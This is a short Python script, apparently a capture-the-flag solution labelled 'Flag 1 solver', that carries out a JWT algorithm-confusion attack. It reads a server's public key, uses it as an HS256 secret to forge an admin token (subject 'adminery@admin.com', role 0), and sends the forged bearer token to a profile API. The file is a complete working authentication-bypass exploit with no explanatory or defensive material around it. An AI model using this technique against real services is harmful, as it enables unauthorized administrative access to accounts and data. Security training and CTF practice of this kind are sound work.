import jwt
import requests
from datetime import datetime, timedelta
from argparse import ArgumentParser

def read_key(path):
    with open(path, 'rb') as f:
        key = f.read()
    return key

def decode_token(token, key):
    return jwt.decode(token, key, algorithms=["ES256", "HS256"])

def encode_token(token, key):
    return jwt.encode(token, key, algorithm="HS256")

def main():
    parser = ArgumentParser(prog="flag1", description="Flag 1 solver")
    parser.add_argument("public_key", help="The public key file.")
    parser.add_argument("-t", "--token", help="Decode this token with supplied key if provided.")
    parser.add_argument("-u", "--url", default="http://localhost:3000/api/v1/profile", help="URL to the authen API.")
    args = parser.parse_args()

    key = read_key(args.public_key)
    if args.token:
        print("DECODE TOKEN WITH ES256/HS256")
        print("-"*40)
        print(decode_token(args.token, key))
        print()

    now = datetime.utcnow()
    payload = {
        "exp": now + timedelta(hours=24),
        "iat": now,
        "sub": "adminery@admin.com",
        "role": 0
    }
    fake_token = encode_token(payload, key)

    print("ENCODE ADMIN TOKEN WITH HS256")
    print("-"*40)
    print("Payload:", payload)
    print("Token:", fake_token)
    print("Decoded:", decode_token(fake_token, key))
    print()

    print("SEND REQUEST WITH FALSE TOKEN")
    print("-"*40)
    print("URL:", args.url)
    resp = requests.get(args.url, headers={"Authorization": f"Bearer {fake_token}"})
    print("Response:", str(resp.content))

main()
